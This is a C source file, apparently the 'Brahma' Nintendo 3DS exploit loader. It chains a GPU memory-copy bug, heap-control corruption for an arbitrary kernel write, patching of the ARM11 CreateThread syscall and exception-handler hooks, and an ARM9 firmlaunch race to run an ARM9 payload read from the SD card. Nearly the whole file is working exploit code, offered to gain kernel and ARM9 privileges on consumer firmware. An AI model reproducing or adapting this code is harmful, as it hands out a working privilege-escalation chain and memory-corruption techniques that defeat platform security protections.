#include <3ds.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>
#include "brahma.h"
#include "sysdep.h"

// some ugly global vars

struct exploit_data ed;
struct arm11_shared_data arm11shared;

u8 sd_arm9_buf[1024 * 1000];
u32 sd_arm9_size = 0;
s32 sd_arm9_loaded = 0;

u8 is_healed_svc_handler = 0;


/* overwrites two instructions (8 bytes in total) at src_addr
   with code that redirects execution to dst_addr */ 
void redirect_codeflow(u32 *dst_addr, u32 *src_addr) {
	*(src_addr + 1) = dst_addr;
	*src_addr = ARM_JUMPOUT;	
}

/* exploits a bug that causes the GPU to copy memory
   that otherwise would be inaccessible to code from
   non-privileged code */
int do_gshax_copy(void *dst, void *src, unsigned int len) {
	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
	int i = 0;

	for (i = 0; i < 16; ++i) {
		GSPGPU_FlushDataCache (NULL, src, len);
		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
		GSPGPU_FlushDataCache (NULL, check_mem, 16);
		GX_SetTextureCopy(NULL, src, 0, check_mem, 0, 0x40, 8);
	}
	HB_FlushInvalidateCache();
	linearFree(check_mem);
	return 0;
}

/* fills exploit_data structure with information that is specific
   to 3DS model and firmware version
   
   returns: 0 on failure, 1 on success */ 
int get_exploit_data(struct exploit_data *data) {
	u32 fversion = 0;    
	u8  isN3DS = 0;
	s32 i;
	s32 result = 0;
	u32 sysmodel = SYS_MODEL_NONE;
	
	if(!data)
		return result;
	
	fversion = osGetFirmVersion();
	APT_CheckNew3DS(NULL, &isN3DS);
	sysmodel = isN3DS ? SYS_MODEL_NEW_3DS : SYS_MODEL_OLD_3DS;
	
	/* attempt to find out whether the exploit supports 'our'
	   current 3DS model and FIRM version */
	for(i=0; i < sizeof(supported_systems)/sizeof(supported_systems[0]); i++) {
		if (supported_systems[i].firm_version == fversion &&
			supported_systems[i].sys_model & sysmodel) {
				memcpy(data, &supported_systems[i], sizeof(struct exploit_data));
				result = 1;
				break;
		}
	}
	return result;
}

/* exploits a bug which causes the ARM11 kernel
   to write a certain value to 'address' */
void priv_write_four(u32 address) {
	const u32 size_heap_cblk = 8 * sizeof(u32);
	u32 addr_lin, addr_lin_o;
	u32 dummy;
	u32 *saved_heap = linearMemAlign(size_heap_cblk, 0x10);
	u32 *cstm_heap = linearMemAlign(size_heap_cblk, 0x10);

	svcControlMemory(&addr_lin, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
	addr_lin_o = addr_lin + 0x1000;
	svcControlMemory(&dummy, addr_lin_o, 0, 0x1000, MEMOP_FREE, 0); 

	// back up heap
	do_gshax_copy(saved_heap, addr_lin_o, size_heap_cblk);

	// set up a custom heap ctrl structure
	cstm_heap[0] = 1;
	cstm_heap[1] = address - 8;
	cstm_heap[2] = 0;
	cstm_heap[3] = 0;

	// corrupt heap ctrl structure by overwriting it with our custom struct
	do_gshax_copy(addr_lin_o, cstm_heap, 4 * sizeof(u32));
	
	// Trigger write to 'address' 
	svcControlMemory(&dummy, addr_lin, 0, 0x1000, MEMOP_FREE, 0);
   
	// restore heap
	do_gshax_copy(addr_lin, saved_heap, size_heap_cblk);

	linearFree(saved_heap);
	linearFree(cstm_heap);
	
	return;	
}

// trick to clear icache
void user_clear_icache() {
	int i, result = 0;
	int (*nop_func)(void);
	const int size_nopslide = 0x1000;	
	u32 nop_slide[size_nopslide] __attribute__((aligned(0x1000)));		

	HB_ReprotectMemory(nop_slide, 4, 7, &result);

	for (i = 0; i < size_nopslide / sizeof(u32); i++) {
		nop_slide[i] = ARM_NOP;
	}
	nop_slide[i-1] = ARM_RET;
	nop_func = nop_slide;
	HB_FlushInvalidateCache();
	
	nop_func();
	return;
}

/* Corrupts ARM11 kernel code (CreateThread()) in order to
   open a door for ARM11 code execution with kernel privileges. */
int corrupt_arm11_kernel_code(void) {
	int i;
	int (*nop_func)(void);
	int *ipc_buf;
	int result = 0;
	
	// get system dependent data required for the exploit		
	if (get_exploit_data(&ed)) {
		
		/* prepare system-dependant data required by
		the exploit's ARM11 kernel code */
		
		arm11shared.va_hook1_ret = ed.va_hook1_ret;
		arm11shared.va_pdn_regs = ed.va_pdn_regs;
		arm11shared.va_pxi_regs = ed.va_pxi_regs;
	
		// corrupt certain parts of the svcCreateThread() kernel code
		priv_write_four(ed.va_patch_createthread);
	
		// clear icache from "userland"
		user_clear_icache();
		result = 1;		
	}

	return result;
}

/* reads ARM9 payload from a given path.
   filename - full path of payload
   buf - ptr to a global buffer that will hold the entire payload
   buf_size - size of the 'buf' variable
   out_size - will contain the payload's actual size

   returns: 0 on failure, 1 on success
   
   payload must be aligned to a 4 byte boundary and >= 8 bytes in total */
int load_arm9_payload(char *filename, void *buf, u32 buf_size, u32 *out_size) {
	int result = 0;
	u32 fsize = 0;
	
	if ((!filename) || (!buf) || (!buf_size) || (!out_size))
		return result; 
	
	FILE *f = fopen(filename, "rb");
	if (f) {
		fseek(f , 0, SEEK_END);
		fsize = ftell(f);
		rewind(f);
		if (fsize >= 8 && !(fsize % 4) && (fsize < buf_size)) {
				u32 bytes_read = fread(buf, 1, fsize, f);
				if (bytes_read == fsize) {
					*out_size = fsize;
					result = 1;
				}
		}
		fclose(f);
	}
	return result;
}

/* copies externally loaded ARM9 payload to FCRAM
   - Please note that the ARM11 payload copies
     the original ARM9 entry point from the mapped
	 FIRM header to offset 4 of the ARM9 payload.
	 Thus, the ARM9 payload should consist of
	 - a branch instruction at offset 0 and
	 - a placeholder (u32) at offset 4 (=ARM9 entrypoint) */ 
int map_arm9_payload(void) {
	extern u32 arm9_start[];
	extern u32 arm9_end[];

	u32 *src, *src_end;
	
	if (!sd_arm9_loaded) {
		src = arm9_start;
		src_end = arm9_end;
	}
	else {
		src = sd_arm9_buf;
		src_end = sd_arm9_buf + sd_arm9_size;
	}
	
	u32 *dst = (u32 *)(ed.va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);
	while (src != src_end) {
		*dst = *src;
		src++;
		dst++;				
	}	
}

void exploit_arm9_race_condition() {
	u32 *src, *dst;
	extern u32 arm11_start[];
	extern u32 arm11_end[];
	extern u32 arm11_globals_start[];
	extern u32 arm11_globals_end[];

	int (* const _KernelSetState)(int, int, int, int) = (void *)ed.va_kernelsetstate;
	
	asm volatile ("clrex");

	/* copy ARM11 payload to lower, writable mirror of
	   mapped exception handlers */
	dst = (u32 *)(ed.va_exc_handler_base_W + OFFS_EXC_HANDLER_UNUSED);
	for (src = arm11_start; src != arm11_end;) {
		*dst = *src;
		dst++;
		src++;		
	}

	/* copy firmware- and console specific data */
	dst = (u32 *)(ed.va_exc_handler_base_W + 
	              OFFS_EXC_HANDLER_UNUSED +
	              ((arm11_end-arm11_start)<<2));
	for (src = &arm11shared; src != &arm11shared + 
		sizeof(arm11shared) / sizeof(u32);) {
			*dst = *src;
			dst++;
			src++;		
	}

	/* copy ARM9 payload to FCRAM */
	map_arm9_payload();

	/* patch ARM11 kernel to force it to execute
	   our code (hook1 and hook2) as soon as a
	   "firmlaunch" is triggered */ 	 
	redirect_codeflow(ed.va_exc_handler_base_X +
	                  OFFS_EXC_HANDLER_UNUSED,
	                  ed.va_patch_hook1);

	redirect_codeflow(PA_EXC_HANDLER_BASE +
	                  OFFS_EXC_HANDLER_UNUSED + 4,
	                  ed.va_patch_hook2);
	
	CleanEntireDataCache();
	InvalidateEntireInstructionCache();

	// trigger ARM9 code execution through "firmlaunch"
	_KernelSetState(0, 0, 2, 0);	
}

/* - restores corrupted code of CreateThread() syscall
   - if heal_svc_handler is true, a patch to the ARM11
     Kernel's syscall handler is applied in order to
     remove a certain restriction. */
apply_patches (bool heal_svc_handler) {
	asm volatile ("clrex");
	
	CleanEntireDataCache();
	InvalidateEntireInstructionCache();	

	// repair CreateThread()
	*(int *)(ed.va_patch_createthread) = 0x8DD00CE5;
			
	// heal svc handler (patch it to allow access to restricted SVCs) 
	if(heal_svc_handler && ed.va_patch_svc_handler > 0) {
		*(int *)(ed.va_patch_svc_handler) = ARM_NOP;
		*(int *)(ed.va_patch_svc_handler+8) = ARM_NOP;
		is_healed_svc_handler = 1;
	}

	CleanEntireDataCache();
	InvalidateEntireInstructionCache();	

	return 0;
}

int __attribute__((naked))
launch_privileged_code (void) {
	asm volatile ("add sp, sp, #8\t\n");
	
	// repair CreateThread() but don't patch SVC handler
	apply_patches (false);
	// acquire ARM9 code execution privileges
	exploit_arm9_race_condition();
	
	asm volatile ("movs r0, #0\t\n"
			 "ldr pc, [sp], #4\t\n");
}

int run_exploit() {

	user_clear_icache();

	printf("* BRAHMA *\n\n");	
	printf("[+] Getting ARM11 kernel privileges\n");
	
	if(corrupt_arm11_kernel_code ()) {
	
		// if present in "/3ds/PastaCFW/loader.bin" , this will run it.
		sd_arm9_loaded = load_arm9_payload("/3ds/PastaCFW/loader.bin",
		                                   &sd_arm9_buf,
		                                   sizeof(sd_arm9_buf),
		                                   &sd_arm9_size);
		printf("[+] Loaded %s ARM9 payload\n",
				sd_arm9_loaded ? "external" : "built-in");
		
		printf("[+] Running payload\n");	
		svcCorruptedCreateThread(launch_privileged_code);			
		printf("[!] Failure\n");
		
		if(is_healed_svc_handler) {
			/* if exploiting the ARM9 race condition did not
			   succeed but the ARM11 kernel's SVC handler has been
			   patched, we might still execute privileged ARM11 code
			   in kernel mode, here */
		}
	}
	else
		printf("[!] 3DS model/firmware not yet supported\n");

	return 0;
}
